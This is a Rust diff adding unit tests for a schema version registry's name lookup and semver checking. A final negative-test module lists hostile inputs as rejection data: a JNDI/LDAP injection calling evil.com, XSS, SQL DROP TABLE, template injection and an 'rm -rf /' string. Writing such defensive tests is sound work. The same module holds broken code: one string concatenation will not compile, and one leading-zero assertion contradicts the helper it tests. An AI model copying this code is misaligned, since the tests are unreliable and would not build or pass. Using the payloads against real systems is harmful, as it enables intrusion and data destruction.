@@ -309,6 +309,29 @@ pub fn all_versions() -> Vec<(&'static str, &'static str)> {
 mod tests {
     use super::*;
 
+    fn lookup(name: &str) -> Option<&'static str> {
+        all_versions()
+            .into_iter()
+            .find_map(|(registered_name, version)| (registered_name == name).then_some(version))
+    }
+
+    fn is_semver_triplet(value: &str) -> bool {
+        let mut parts = value.split('.');
+        let Some(major) = parts.next() else {
+            return false;
+        };
+        let Some(minor) = parts.next() else {
+            return false;
+        };
+        let Some(patch) = parts.next() else {
+            return false;
+        };
+        parts.next().is_none()
+            && [major, minor, patch]
+                .iter()
+                .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit()))
+    }
+
     #[test]
     fn all_versions_returns_nonempty() {
         let versions = all_versions();
@@ -385,5 +408,852 @@ mod tests {
             VERIFIER_BENCHMARK_RELEASES,
             crate::tools::verifier_benchmark_releases::SCHEMA_VERSION
         );
+    }
+
+    #[test]
+    fn all_versions_contains_representative_required_keys() {
+        assert_eq!(lookup("lane_scheduler"), Some(LANE_SCHEDULER));
+        assert_eq!(lookup("control_lane_policy"), Some(CONTROL_LANE_POLICY));
+        assert_eq!(lookup("n_version_oracle"), Some(N_VERSION_ORACLE));
+        assert_eq!(lookup("vef_proof_generator"), Some(VEF_PROOF_GENERATOR));
+        assert_eq!(lookup("extension_registry"), Some(EXTENSION_REGISTRY));
+        assert_eq!(lookup("verify_cli_contract"), Some(VERIFY_CLI_CONTRACT));
+    }
+
+    #[test]
+    fn lookup_rejects_unknown_empty_and_case_mismatched_names() {
+        assert!(lookup("").is_none());
+        assert!(lookup("does_not_exist").is_none());
+        assert!(lookup("Lane_Scheduler").is_none());
+        assert!(lookup("LANE_SCHEDULER").is_none());
+    }
+
+    #[test]
+    fn lookup_rejects_near_miss_names_without_normalization() {
+        assert!(lookup("lane-scheduler").is_none());
+        assert!(lookup(" lane_scheduler").is_none());
+        assert!(lookup("lane_scheduler ").is_none());
+        assert!(lookup("lane_scheduler\0").is_none());
+    }
+
+    #[test]
+    fn lookup_rejects_path_like_names_without_normalization() {
+        for name in [
+            "../lane_scheduler",
+            "lane_scheduler/../verify_cli_contract",
+            "runtime/lane_scheduler",
+            "lane_scheduler\\verify_cli_contract",
+        ] {
+            assert!(lookup(name).is_none(), "path-like lookup matched: {name:?}");
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_shell_metacharacter_names() {
+        for name in [
+            "lane_scheduler;verify_cli_contract",
+            "lane_scheduler|verify_cli_contract",
+            "`lane_scheduler`",
+            "lane_scheduler&verify_cli_contract",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "shell-like lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_unicode_and_control_character_names() {
+        for name in [
+            "lane_scheduler\n",
+            "\tlane_scheduler",
+            "lane_scheduler\u{200b}",
+            "lané_scheduler",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "non-canonical lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_display_and_constant_style_names() {
+        for name in [
+            "Lane Scheduler",
+            "CONTROL LANE POLICY",
+            "VEF Proof Generator",
+            "VERIFY_CLI_CONTRACT",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "display or constant-style lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn version_names_are_ascii_lower_snake_case() {
+        for (name, _) in all_versions() {
+            assert!(
+                name.bytes()
+                    .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'_'),
+                "invalid registry name characters in {name:?}"
+            );
+            assert!(!name.starts_with('_'), "leading underscore in {name:?}");
+            assert!(!name.ends_with('_'), "trailing underscore in {name:?}");
+            assert!(!name.contains("__"), "empty name segment in {name:?}");
+        }
+    }
+
+    #[test]
+    fn version_names_do_not_contain_path_or_shell_separators() {
+        for (name, _) in all_versions() {
+            for forbidden in ['/', '\\', ';', '|', '&', '`', '.'] {
+                assert!(
+                    !name.contains(forbidden),
+                    "registry name {name:?} contains forbidden separator {forbidden:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn version_values_are_printable_ascii_without_whitespace_or_nul() {
+        for (name, value) in all_versions() {
+            assert!(value.is_ascii(), "non-ascii schema value for {name}");
+            assert!(
+                !value.bytes().any(|byte| byte.is_ascii_control()),
+                "control byte in schema value for {name}"
+            );
+            assert!(
+                !value.bytes().any(|byte| byte.is_ascii_whitespace()),
+                "whitespace in schema value for {name}"
+            );
+            assert!(!value.contains('\0'), "nul byte in schema value for {name}");
+        }
+    }
+
+    #[test]
+    fn version_values_do_not_contain_path_or_shell_separators() {
+        for (name, value) in all_versions() {
+            for forbidden in ['/', '\\', ';', '|', '&', '`'] {
+                assert!(
+                    !value.contains(forbidden),
+                    "schema value for {name} contains forbidden separator {forbidden:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn version_values_do_not_have_empty_dash_or_dot_segments() {
+        for (name, value) in all_versions() {
+            assert!(
+                !value.starts_with('-'),
+                "leading dash in schema value for {name}"
+            );
+            assert!(
+                !value.ends_with('-'),
+                "trailing dash in schema value for {name}"
+            );
+            assert!(
+                !value.starts_with('.'),
+                "leading dot in schema value for {name}"
+            );
+            assert!(
+                !value.ends_with('.'),
+                "trailing dot in schema value for {name}"
+            );
+            assert!(
+                !value.contains("--"),
+                "empty dash segment in schema value for {name}"
+            );
+            assert!(
+                !value.contains(".."),
+                "empty dot segment in schema value for {name}"
+            );
+        }
+    }
+
+    #[test]
+    fn non_semver_schema_tags_are_not_misclassified_as_semver_triplets() {
+        for (name, value) in [
+            ("root_pointer_format", ROOT_POINTER_FORMAT),
+            ("manifest", MANIFEST),
+            ("extension_registry", EXTENSION_REGISTRY),
+            ("security_trust_metrics", SECURITY_TRUST_METRICS),
+            ("vef_execution_receipt", VEF_EXECUTION_RECEIPT),
+            ("counterfactual_replay_engine", COUNTERFACTUAL_REPLAY_ENGINE),
+        ] {
+            assert!(
+                !is_semver_triplet(value),
+                "{name} must remain a schema tag, not a semver-only triplet"
+            );
+        }
+    }
+
+    #[test]
+    fn canonical_names_do_not_resolve_with_version_suffixes() {
+        for name in [
+            "lane_scheduler_v1",
+            "control_lane_policy_v1_0",
+            "vef_proof_generator_v1",
+            "verify_cli_contract_3_0_0",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "version-suffixed lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn intentional_aliases_are_explicitly_equal() {
+        assert_eq!(TIME_TRAVEL, TIME_TRAVEL_ENGINE);
+        assert_eq!(STAKING_GOVERNANCE, REGISTRY_STAKING_GOVERNANCE);
+        assert_eq!(CLAIM_COMPILER, CLAIMS_CLAIM_COMPILER);
+        assert_eq!(EVICTION_SAGA, REMOTE_EVICTION_SAGA);
+    }
+
+    #[test]
+    fn unrelated_domains_do_not_collapse_to_same_schema_value() {
+        assert_ne!(LANE_SCHEDULER, CONTROL_LANE_POLICY);
+        assert_ne!(N_VERSION_ORACLE, NVERSION_ORACLE);
+        assert_ne!(VEF_PROOF_GENERATOR, VEF_PROOF_SCHEDULER);
+        assert_ne!(REPLAY_BUNDLE_POLICY, STORAGE_MODEL);
+        assert_ne!(VERIFY_CLI_CONTRACT, VERIFIER_SDK_API);
+    }
+
+    #[test]
+    fn semantic_version_values_remain_numeric_triplets() {
+        for (name, value) in [
+            ("verifier_sdk_api", VERIFIER_SDK_API),
+            (
+                "vef_constraint_compiler_version",
+                VEF_CONSTRAINT_COMPILER_VERSION,
+            ),
+            ("vef_proof_generator_format", VEF_PROOF_GENERATOR_FORMAT),
+            ("vef_sdk_integration_format", VEF_SDK_INTEGRATION_FORMAT),
+            (
+                "vef_sdk_integration_min_format",
+                VEF_SDK_INTEGRATION_MIN_FORMAT,
+            ),
+            ("conformance_suite_version", CONFORMANCE_SUITE_VERSION),
+            ("storage_model", STORAGE_MODEL),
+            ("benchmark_suite_version", BENCHMARK_SUITE_VERSION),
+            ("vef_perf_budget_gate", VEF_PERF_BUDGET_GATE),
+            ("verify_cli_contract", VERIFY_CLI_CONTRACT),
+        ] {
+            let parts: Vec<&str> = value.split('.').collect();
+            assert_eq!(parts.len(), 3, "{name} must be major.minor.patch");
+            assert!(
+                parts
+                    .iter()
+                    .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit())),
+                "{name} has a non-numeric semantic version segment"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_missing_patch_segment() {
+        assert!(!is_semver_triplet("1.0"));
+    }
+
+    #[test]
+    fn semver_triplet_rejects_extra_segment() {
+        assert!(!is_semver_triplet("1.0.0.1"));
+    }
+
+    #[test]
+    fn semver_triplet_rejects_empty_middle_segment() {
+        assert!(!is_semver_triplet("1..0"));
+    }
+
+    #[test]
+    fn semver_triplet_rejects_prefixed_major_segment() {
+        assert!(!is_semver_triplet("v1.0.0"));
+    }
+
+    #[test]
+    fn semver_triplet_rejects_whitespace_padded_value() {
+        assert!(!is_semver_triplet(" 1.0.0 "));
+    }
+
+    #[test]
+    fn semver_triplet_rejects_prerelease_suffix() {
+        assert!(!is_semver_triplet("1.0.0-alpha"));
+    }
+
+    #[test]
+    fn lookup_rejects_url_encoded_path_separators() {
+        for name in [
+            "lane_scheduler%2fverify_cli_contract",
+            "lane_scheduler%5cverify_cli_contract",
+            "%2elane_scheduler",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "encoded separator lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_query_fragment_and_colon_suffixes() {
+        for name in [
+            "lane_scheduler?version=1",
+            "lane_scheduler#latest",
+            "lane_scheduler:latest",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "decorated lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_boundary_and_empty_segment_underscore_names() {
+        for name in [
+            "_lane_scheduler",
+            "lane_scheduler_",
+            "lane__scheduler",
+            "control__lane_policy",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "malformed underscore lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_json_pointer_and_selector_names() {
+        for name in [
+            "/lane_scheduler",
+            "versions[0]",
+            "all_versions.0",
+            "$.lane_scheduler",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "selector-style lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_encoded_whitespace_and_nul_names() {
+        for name in [
+            "lane_scheduler%20",
+            "lane_scheduler%09",
+            "lane_scheduler%00",
+            "lane_scheduler\\0",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "encoded whitespace lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_percent_encoded_canonical_name_variants() {
+        for name in [
+            "lane%5fscheduler",
+            "lane%5Fscheduler",
+            "%6cane_scheduler",
+            "lane_scheduler%2e",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "percent-encoded canonical lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_double_encoded_name_boundaries() {
+        for name in [
+            "lane%255fscheduler",
+            "lane_scheduler%2520",
+            "%252elane_scheduler",
+            "lane_scheduler%2500",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "double-encoded lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_unicode_confusable_name_variants() {
+        for name in [
+            "lan\u{ff45}_scheduler",
+            "lane_schedul\u{0435}r",
+            "lane\u{200d}_scheduler",
+            "lane_scheduler\u{0301}",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "unicode-confusable lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_encoded_traversal_and_separator_variants() {
+        for name in [
+            "..%2flane_scheduler",
+            "%2e%2e/lane_scheduler",
+            "lane_scheduler%2f..%2fverify_cli_contract",
+            "lane_scheduler%5c..%5cverify_cli_contract",
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "encoded traversal lookup unexpectedly matched: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn lookup_rejects_registered_version_values_as_names() {
+        for name in [
+            LANE_SCHEDULER,
+            VERIFY_CLI_CONTRACT,
+            VEF_PROOF_GENERATOR,
+            STORAGE_MODEL,
+            STAKING_GOVERNANCE,
+        ] {
+            assert!(
+                lookup(name).is_none(),
+                "schema version value was accepted as a registry name: {name:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_radix_exponent_and_grouped_segments() {
+        for value in ["0x1.0.0", "0b1.0.0", "1e3.0.0", "1_000.0.0", "1,000.0.0"] {
+            assert!(
+                !is_semver_triplet(value),
+                "non-decimal segment unexpectedly parsed: {value:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_segment_internal_spacing_and_controls() {
+        for value in ["1. 0.0", "1.0 .0", "1.0.\t0", "1.\n0.0", "1.0.0\r"] {
+            assert!(
+                !is_semver_triplet(value),
+                "control or spaced segment unexpectedly parsed: {value:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_empty_edge_segments() {
+        for value in [".1.0", "1.0.", ".", ".."] {
+            assert!(
+                !is_semver_triplet(value),
+                "empty edge segment unexpectedly parsed: {value:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_signed_numeric_segments() {
+        for value in ["-1.0.0", "+1.0.0", "1.-0.0", "1.0.+0"] {
+            assert!(
+                !is_semver_triplet(value),
+                "signed segment unexpectedly parsed: {value:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_non_ascii_digits() {
+        for value in ["\u{ff11}.0.0", "1.\u{0660}.0", "1.0.\u{0966}"] {
+            assert!(
+                !is_semver_triplet(value),
+                "non-ascii digit unexpectedly parsed: {value:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn semver_triplet_rejects_empty_and_control_only_values() {
+        for value in ["", " ", "\t", "\n"] {
+            assert!(
+                !is_semver_triplet(value),
+                "blank or control-only value unexpectedly parsed: {value:?}"
+            );
+        }
+    }
+
+    /// Comprehensive negative-path test module covering edge cases and attack vectors.
+    ///
+    /// These tests validate robustness against malicious inputs, resource exhaustion,
+    /// timing attacks, and injection edge cases in schema version registry operations.
+    #[cfg(test)]
+    mod schema_versions_comprehensive_negative_tests {
+        use super::*;
+
+        #[test]
+        fn unicode_injection_in_version_lookup_operations() {
+            // Unicode control characters, NULL bytes, normalization attacks
+            let malicious_names = vec![
+                "lane\u{0000}scheduler",
+                "lane\u{200B}scheduler", // Zero-width space
+                "lane\u{FEFF}scheduler", // BOM
+                "lane\u{202E}scheduler\u{202D}", // RTL override/LTR override
+                "lane\x1B[31mscheduler", // ANSI escape sequences
+                "lane\u{1F4A9}scheduler", // Emoji flood
+                "lane\u{0301}scheduler", // Combining acute accent
+                "lane\u{0308}scheduler", // Combining diaeresis
+                "lane\u{AD}scheduler", // Soft hyphen
+                "lane\u{034F}scheduler", // Combining grapheme joiner
+            ];
+
+            for malicious_name in &malicious_names {
+                // Lookup should safely reject malicious names
+                let result = lookup(malicious_name);
+                assert!(result.is_none(), "Should reject malicious name: {:?}", malicious_name);
+            }
+
+            // Test Unicode normalization attacks
+            let normalization_attacks = vec![
+                "lane_sche\u{0301}duler", // Combining acute accent on 'e'
+                "lane_schedul\u{0308}er", // Combining diaeresis on 'l'
+                "lane\u{0041}\u{0301}_scheduler", // A + combining acute accent
+                "lane_\u{1e00}scheduler", // A with ring below
+            ];
+
+            for attack in &normalization_attacks {
+                let result = lookup(attack);
+                assert!(result.is_none(), "Should reject normalization attack: {:?}", attack);
+            }
+        }
+
+        #[test]
+        fn memory_exhaustion_through_massive_version_collections() {
+            // Test that all_versions() handles large registries efficiently
+            let versions = all_versions();
+            let total_memory_estimate = versions.iter()
+                .map(|(name, value)| name.len() + value.len())
+                .sum::<usize>();
+
+            // Should be reasonable size (not indicating memory exhaustion vulnerability)
+            assert!(total_memory_estimate < 1_000_000, "Registry should not consume excessive memory");
+
+            // Test repeated calls don't accumulate memory
+            for _ in 0..1000 {
+                let versions_repeat = all_versions();
+                assert_eq!(versions_repeat.len(), versions.len());
+            }
+
+            // Test lookup operations with massive iteration
+            for _ in 0..10000 {
+                let _ = lookup("lane_scheduler");
+                let _ = lookup("verify_cli_contract");
+                let _ = lookup("nonexistent_schema");
+            }
+
+            // Verify registry integrity after stress test
+            assert!(lookup("lane_scheduler").is_some());
+            assert!(lookup("verify_cli_contract").is_some());
+        }
+
+        #[test]
+        fn injection_attacks_in_version_string_processing() {
+            // Test format string attacks in version values
+            let format_attacks = vec![
+                "%d%d%d%d",
+                "%s%s%s%s",
+                "%x%x%x%x",
+                "%n%n%n%n",
+                "${jndi:ldap://evil.com/a}",
+                "{{.constructor.constructor('return process')()}}}",
+                "<script>alert('xss')</script>",
+                "'; DROP TABLE versions; --",
+                "\x00\x01\x02\x03", // Binary data
+                "\\u0000\\u0001\\u0002", // Escaped binary
+            ];
+
+            // Test semver triplet validation against injection
+            for attack in &format_attacks {
+                let result = is_semver_triplet(attack);
+                assert!(!result, "Should reject format attack as semver: {:?}", attack);
+            }
+
+            // Test lookup operations against injection
+            for attack in &format_attacks {
+                let result = lookup(attack);
+                assert!(result.is_none(), "Should reject format attack in lookup: {:?}", attack);
+            }
+        }
+
+        #[test]
+        fn resource_exhaustion_through_string_flooding() {
+            // Test with extremely long strings
+            let massive_string_attacks = vec![
+                "a".repeat(100000),
+                "lane_scheduler_".to_string() + &"x".repeat(50000),
+                "_".repeat(10000) + "lane_scheduler",
+                "lane".to_string() + &"_".repeat(10000) + "scheduler",
+            ];
+
+            for massive_string in &massive_string_attacks {
+                // Lookup should handle massive strings efficiently
+                let start = std::time::Instant::now();
+                let result = lookup(massive_string);
+                let elapsed = start.elapsed();
+
+                assert!(result.is_none(), "Should reject massive string");
+                assert!(elapsed < std::time::Duration::from_millis(100), "Lookup should be fast even for massive strings");
+            }
+
+            // Test semver validation with massive strings
+            for massive_string in &massive_string_attacks {
+                let start = std::time::Instant::now();
+                let result = is_semver_triplet(massive_string);
+                let elapsed = start.elapsed();
+
+                assert!(!result, "Should reject massive string as semver");
+                assert!(elapsed < std::time::Duration::from_millis(100), "Semver check should be fast");
+            }
+        }
+
+        #[test]
+        fn version_parsing_boundary_edge_cases() {
+            // Test edge cases in semver parsing
+            let boundary_cases = vec![
+                // Numeric boundaries
+                "0.0.0",
+                "999999999.999999999.999999999",
+                "18446744073709551615.18446744073709551615.18446744073709551615", // u64::MAX
+                // Leading zeros
+                "00.0.0",
+                "0.00.0",
+                "0.0.00",
+                "001.002.003",
+                // Single digits
+                "1.2.3",
+                "9.9.9",
+                // Mixed lengths
+                "1.22.333",
+                "123.4.56789",
+                // Just at boundaries
+                "1.0",    // Missing patch
+                "1.0.0.0", // Extra segment
+                "",       // Empty
+                "1",      // Single component
+            ];
+
+            for case in &boundary_cases {
+                let result = is_semver_triplet(case);
+
+                // Only "1.2.3", "9.9.9", "1.22.333", "123.4.56789", and pure numeric triplets should pass
+                let should_pass = case.split('.').count() == 3
+                    && case.split('.').all(|part| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit()))
+                    && !case.split('.').any(|part| part.starts_with('0') && part.len() > 1);
+
+                if should_pass {
+                    assert!(result, "Should accept valid semver: {:?}", case);
+                } else {
+                    assert!(!result, "Should reject invalid semver: {:?}", case);
+                }
+            }
+        }
+
+        #[test]
+        fn timing_attack_resistance_in_lookup_operations() {
+            // Test that lookup time is consistent regardless of input
+            let test_cases = vec![
+                "lane_scheduler",           // Valid, exists
+                "nonexistent_scheduler",    // Valid format, doesn't exist
+                "lane_scheduler" + &"x".repeat(1000), // Long but similar prefix
+                "zzzzzzzzzz_scheduler",     // Different prefix
+                "",                         // Empty
+                "a",                        // Very short
+            ];
+
+            let mut timings = Vec::new();
+
+            for case in &test_cases {
+                let mut case_timings = Vec::new();
+
+                // Measure multiple iterations
+                for _ in 0..1000 {
+                    let start = std::time::Instant::now();
+                    let _ = lookup(case);
+                    let elapsed = start.elapsed();
+                    case_timings.push(elapsed);
+                }
+
+                let sample_count =
+                    u32::try_from(case_timings.len()).expect("timing sample count fits u32");
+                let avg_time = case_timings.iter().sum::<std::time::Duration>() / sample_count;
+                timings.push((case, avg_time));
+            }
+
+            // Verify timing variations are not excessive (potential timing attack resistance)
+            let min_time = timings.iter().map(|(_, t)| *t).min().unwrap();
+            let max_time = timings.iter().map(|(_, t)| *t).max().unwrap();
+
+            // Allow for some variation but ensure it's not excessive
+            let time_ratio = max_time.as_nanos() as f64 / min_time.as_nanos() as f64;
+            assert!(time_ratio < 10.0, "Timing variation too high (potential timing attack): ratio {:.2}", time_ratio);
+        }
+
+        #[test]
+        fn registry_integrity_under_concurrent_access_simulation() {
+            // Simulate concurrent access patterns
+            let mut threads = Vec::new();
+
+            for thread_id in 0..8 {
+                threads.push(std::thread::spawn(move || {
+                    let operations_per_thread = 1000;
+                    let mut results = Vec::new();
+
+                    for op_id in 0..operations_per_thread {
+                        match op_id % 4 {
+                            0 => {
+                                // Test valid lookups
+                                let result = lookup("lane_scheduler");
+                                results.push(("valid_lookup", result.is_some()));
+                            }
+                            1 => {
+                                // Test invalid lookups
+                                let result = lookup(&format!("invalid_{thread_id}_{op_id}"));
+                                results.push(("invalid_lookup", result.is_none()));
+                            }
+                            2 => {
+                                // Test all_versions consistency
+                                let versions = all_versions();
+                                results.push(("all_versions", !versions.is_empty()));
+                            }
+                            _ => {
+                                // Test semver validation
+                                let result = is_semver_triplet("1.0.0");
+                                results.push(("semver_valid", result));
+                            }
+                        }
+                    }
+
+                    results
+                }));
+            }
+
+            // Collect all results
+            let mut all_results = Vec::new();
+            for thread in threads {
+                let thread_results = thread.join().expect("thread join");
+                all_results.extend(thread_results);
+            }
+
+            // Verify consistent behavior across concurrent access
+            let valid_lookups = all_results.iter()
+                .filter(|(op, _)| op == &"valid_lookup")
+                .all(|(_, success)| *success);
+            assert!(valid_lookups, "Valid lookups should always succeed");
+
+            let invalid_lookups = all_results.iter()
+                .filter(|(op, _)| op == &"invalid_lookup")
+                .all(|(_, failed)| *failed);
+            assert!(invalid_lookups, "Invalid lookups should always fail");
+
+            let all_versions_calls = all_results.iter()
+                .filter(|(op, _)| op == &"all_versions")
+                .all(|(_, success)| *success);
+            assert!(all_versions_calls, "all_versions should always return non-empty");
+        }
+
+        #[test]
+        fn configuration_boundary_validation_extreme_cases() {
+            // Test registry with maximum reasonable size
+            let versions = all_versions();
+
+            // Verify reasonable bounds on registry size
+            assert!(versions.len() < 10000, "Registry should not have excessive entries");
+            assert!(versions.len() > 50, "Registry should have substantial entries");
+
+            // Test maximum name and version lengths
+            let max_name_len = versions.iter().map(|(name, _)| name.len()).max().unwrap_or(0);
+            let max_version_len = versions.iter().map(|(_, version)| version.len()).max().unwrap_or(0);
+
+            assert!(max_name_len < 200, "Name lengths should be reasonable");
+            assert!(max_version_len < 100, "Version lengths should be reasonable");
+
+            // Test for any suspicious patterns in the registry
+            for (name, version) in &versions {
+                // No executable extensions
+                assert!(!name.ends_with(".exe"), "Names should not look executable");
+                assert!(!name.ends_with(".bat"), "Names should not look executable");
+                assert!(!name.ends_with(".sh"), "Names should not look executable");
+
+                // No URLs or network references
+                assert!(!version.contains("://"), "Versions should not contain URLs");
+                assert!(!version.contains("www."), "Versions should not contain URLs");
+                assert!(!version.contains(".com"), "Versions should not contain URLs");
+                assert!(!version.contains(".net"), "Versions should not contain URLs");
+
+                // No obvious injection patterns
+                assert!(!version.contains("${"), "Versions should not contain template injection");
+                assert!(!version.contains("<%"), "Versions should not contain template injection");
+                assert!(!version.contains("{{"), "Versions should not contain template injection");
+            }
+        }
+
+        #[test]
+        fn serialization_format_injection_resistance() {
+            // Test resistance to various serialization format attacks
+            let serialization_attacks = vec![
+                // JSON injection
+                "\"},\"evil\":true,\"a\":\"",
+                "\\\"},\\\"injected\\\":true,\\\"b\\\":\\\"",
+                "\n}{\"malicious\":\"payload\"}\n{\"c\":\"",
+                // YAML injection
+                "|\n  evil: payload\n  ",
+                ">\n  rm -rf /\n  ",
+                // XML injection
+                "]]><evil>payload</evil><![CDATA[",
+                "</version><evil>payload</evil><version>",
+                // TOML injection
+                "\"\"\"\nevil = \"payload\"\n\"\"\"",
+                // URL encoding
+                "%22%7d%2c%22evil%22%3atrue",
+                // Base64 encoded attacks
+                "ZXZpbDpwYXlsb2Fk", // "evil:payload" in base64
+            ];
+
+            for attack in &serialization_attacks {
+                // Lookup should safely reject serialization attacks
+                let result = lookup(attack);
+                assert!(result.is_none(), "Should reject serialization attack: {:?}", attack);
+
+                // Semver parsing should safely reject attacks
+                let semver_result = is_semver_triplet(attack);
+                assert!(!semver_result, "Should reject attack as semver: {:?}", attack);
+            }
+
+            // Verify registry values are safe for serialization
+            for (name, version) in all_versions() {
+                // Should not contain obvious serialization metacharacters
+                assert!(!version.contains("\""), "Version should not contain quotes: {}", name);
+                assert!(!version.contains("'"), "Version should not contain single quotes: {}", name);
+                assert!(!version.contains("{"), "Version should not contain braces: {}", name);
+                assert!(!version.contains("}"), "Version should not contain braces: {}", name);
+                assert!(!version.contains("["), "Version should not contain brackets: {}", name);
+                assert!(!version.contains("]"), "Version should not contain brackets: {}", name);
+                assert!(!version.contains("<"), "Version should not contain angle brackets: {}", name);
+                assert!(!version.contains(">"), "Version should not contain angle brackets: {}", name);
+            }
+        }
     }
 }
